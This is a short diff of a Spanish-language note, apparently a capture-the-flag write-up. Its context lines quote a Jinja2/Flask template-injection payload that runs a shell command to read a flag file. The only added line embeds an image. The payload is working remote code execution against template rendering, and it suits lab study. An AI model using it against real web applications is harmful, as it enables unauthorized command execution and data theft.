@@ -7,4 +7,5 @@
 - usamos {{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}} para romper su seguridad
 ## Notas adicionales 
 
+![[Pasted image 20260614115354.png]]
 ## Referencias 
